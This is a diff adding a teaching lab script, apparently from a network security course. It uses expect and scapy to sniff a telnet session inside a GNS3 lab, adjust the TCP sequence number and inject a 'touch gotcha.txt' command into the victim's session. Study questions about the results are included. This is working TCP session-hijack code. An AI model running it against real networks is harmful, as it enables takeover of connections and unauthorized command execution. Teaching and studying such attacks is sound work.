@@ -1,0 +1,95 @@
+#!/usr/bin/expect
+#
+# Author: M. Dacier
+# January 2022
+
+spawn "/usr/bin/scapy";
+expect ">>> ";
+
+# PAY ATTENTION TO escape the following chars: " [ and ]
+
+# Trivial script to hijack a telnet connection between c3 and s3 from r2
+# You must first have installed and launched telnetd on s3
+# apk add busybox-extras ; telnetd
+# You must have created a user account (gns3_test)
+# You must have installed a telnet client on c3
+# apk add busybox-extras
+# Launch this script and, only then, 
+# in c3: telnet s3.net3.local
+
+# Result: the command "touch gotcha.txt" will be issued by r2
+# If the file does not exist already,
+# this will create if  in /home/gns3_test in s3
+# If it does exist, it will change the "last modified" timestamp
+# associated with the file, the one you see when issuing the command
+# ls -l /home/gns3_test/gotcha.txt
+
+# Hint: check the packets in Wireshark, the sequence and acknowledgment numbers in particular, carefully
+
+# Did we succeed in issuing the command ?
+# What happened to the connection?
+# Explain
+
+
+# Redo the experiment but, this time,
+# try to enter the following command in c3:
+# touch /data/petittest
+# try the same command a second time .. different result? Why ?
+
+# Redo the experiment but, this time,
+# try to enter the following command in c3:
+# ls
+# try the same command a second time .. different result? Why ?
+# try "touch /data/petitest" ... different result? Why ?
+
+# Redo the experiment but, this time,
+# try to enter the following command in c3:
+# ls /
+# try the same command a second time .. different result? Why ?
+# try "touch /data/petitest" ... different result? Why ?
+
+
+# Hint: check the packets in Wireshark, the sequence and acknowledgment numbers in particular, carefully
+
+# Horrible hack ... we sniff up to 100 packets for 20 seconds ..
+# hopefully this is enough time for the user to enter his username and password
+# We only sniff the packets from the client as it should be the last one
+# speaking (acking) after a successful login
+# Keeping our fingers crossed that the last message from the server had no payload
+# Q: why ? 
+
+send "cap = sniff(filter=\"tcp and dst host 20.20.20.55 and src host 20.20.20.89 and dst port 23\", count=100, iface=\"eth2\", timeout=20) \r" 
+
+# We need to retrieve the last packet sent by the client,
+# and make sure it is an empty one
+
+
+send "am=len(cap)-1\r"
+
+# am is the index of the last packet received
+
+# send "syn=cap\[0\].copy()\r"
+# send "synack=cap\[1\].copy()\r"
+# send "ack=cap\[2\].copy()\r"
+
+send "data=cap\[am\].copy() \r"
+# how many bytes did the client sent in its last packet?
+send "text=len(data\[Raw\].load)\r"
+# increase the seq number accordingly
+send "data\[TCP\].seq=data\[TCP\].seq+text\r"
+
+send "command=\"touch gotcha.txt\\n\"\r"
+send "data=data / Raw(load=command) \r"
+send "del data\[TCP\].chksum \r"
+send "del data\[IP\].chksum \r"
+send "del data\[IP\].len \r"
+
+send "sendp(data, iface=\"eth2\") \r"
+
+
+# This last command enables us to stay within scapy to type more commands
+# interactively, if we so desire.
+
+interact
+
+
